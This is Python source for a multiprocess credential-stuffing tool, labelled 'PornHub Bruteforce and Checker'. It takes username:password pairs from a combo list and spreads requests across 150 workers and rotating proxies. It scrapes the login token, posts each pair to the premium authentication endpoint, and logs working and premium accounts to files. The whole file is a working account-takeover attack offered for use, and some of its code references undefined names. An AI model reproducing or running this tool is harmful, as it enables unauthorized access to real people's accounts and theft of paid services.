import requests
import sys, os
import random
import datetime
import multiprocessing as mp
import time
from helpers.colors import bcolors
from bs4 import BeautifulSoup as soup

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)




class Brute(object):
    def __init__(self):
        self.manager = mp.Manager()
        self.q = mp.Queue()
        self.projectName = "PornHub"
        self.projectFullName = "PornHub Bruteforce and Checker"
        self.description = "Author : Pirate2110"
        self.good = mp.Value('i', 0)
        self.bad = mp.Value('i', 0) 
        self.error = mp.Value('i', 0)
        self.projerror = mp.Value('i', 0)
        self.captcha = mp.Value('i', 0)
        self.projid = 0
        self.proxylink = ""
        self.prlines = self.manager.list()
        self.proxytype = "https"
        self.basename = "log.txt"
        self.proxyname = "proxy.txt"
        self.running = mp.Value('i', True)
        self.timeout = (15, 15)
        self.thread_count = 150
        self.today = datetime.datetime.today()

    def check(self, login, password, good, bad, error, projerror, captcha):
        try:
            pr = self.getproxy()
            if pr == "err":
                time.sleep(1)
            else :
                if self.proxytype == "no":
                    proxies = None
            
                elif self.proxytype == "burp":
                    proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
                else:
                    proxies = {'https': self.proxytype +  "://" + pr, 'http': self.proxytype +  "://" + pr}
                
                headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'}
                s = requests.session()
                r = s.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
                site = soup(r.text, "html.parser")
                token = site.find("input", id="token")
                body = {'username' : login, 'password': password, 'remember_me' : 'on', 'from':'mobile_login', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
                r = s.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
                

                if "\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435" in r.json()['message']:
                    bad.value += 1
                elif r.json()['success'] == "1":
                    if "https://rt.pornhubpremium.com/premium_signup?type=PhP-Lander" in r.json()['redirect']:
                        self.writelog("good.txt", login + ":" + password)
                    else:
                        self.writelog("premium.txt", login + ":" + password + "|" + str(r.text))
                    good.value += 1
                    #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
                
                else:
                    projerror.value += 1
        except Exception as e:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            #print(exc_type, fname, exc_tb.tb_lineno)
            error.value += 1
            self.q.put(login+':'+password)
     
    def stop(self):
        self.running.value = False
        print("Work ended", end='\r')
        sys.stdout.flush()

   


    def mult(self):
        with open(self.basename, "r") as tags:
            for line in tags:
                self.q.put(line.strip())
        self.count_list = self.q.qsize()
        
        if "http" in self.proxylink:
            print('http')
            ptt = mp.Process(target=self.updateProxyLink, daemon=True).start()
            
        else:
            print('prfile')
            with open(self.proxyname, "r") as tags:
                for line in tags:
                    #print(bcolors.WARNING + '[+] Start scanning : ' + line.strip() + bcolors.ENDC)
                    self.prlines.append(line.strip())
                print('Count of proxies : ' + str(len(self.lines))) 
        
        self.startth()

    def startth(self):
        for i in range(self.thread_count):
            t = mp.Process(target=self.work, daemon=True).start()

    def updateProxyLink(self):
        while self.running.value:
            r = requests.get(self.proxylink, verify=False)
            self.prlines[:] = []
            for line in r.text.split('\r\n'):
                self.prlines.append(line)
            time.sleep(60)
    def work(self):
        while self.running.value:
            try: 
                if self.q.empty():
                    self.stop()
                    break

                
                if self.projid == 0:
                    print( str(len(self.lines)) + "/" + str(self.count_list) + " (" + str(len(self.lines)  // (self.count_list/ 100)) + "%) " +bcolors.OKGREEN + str(self.good) + bcolors.ENDC   + "/" + bcolors.FAIL + str(self.bad) + bcolors.ENDC + "/"  + bcolors.WARNING+ str(self.error) + bcolors.ENDC + "/"  + bcolors.UNDERLINE+ str(self.projerror) + bcolors.ENDC + "/"  + bcolors.BOLD+ str(self.captcha) + bcolors.ENDC + " [" + str(threading.active_count()) + "]", end='\r')
                    sys.stdout.flush()
                
                trl = self.q.get()
                
                

                if ":" in trl:
                    self.check(trl.split(':')[0], trl.split(':')[1], self.good, self.bad, self.error, self.projerror, self.captcha)
                if ";" in trl:
                    self.check(trl.split(';')[0], trl.split(';')[1], self.good, self.bad, self.error, self.projerror, self.captcha)
            except (KeyboardInterrupt, SystemExit):
                print("Exiting...")
                break


    def getproxy(self):
        try:
            return str(random.choice(self.prlines))
        except:
            return "err"

    def writelog(self, file, log):
        dirr = "logs/" + self.projectName + "/" + str(self.today.strftime("%H.%M.%S")) + "/" +file
        os.makedirs(os.path.dirname(dirr), exist_ok=True)
        with open(dirr, 'a') as the_file:
            the_file.write(log + '\n')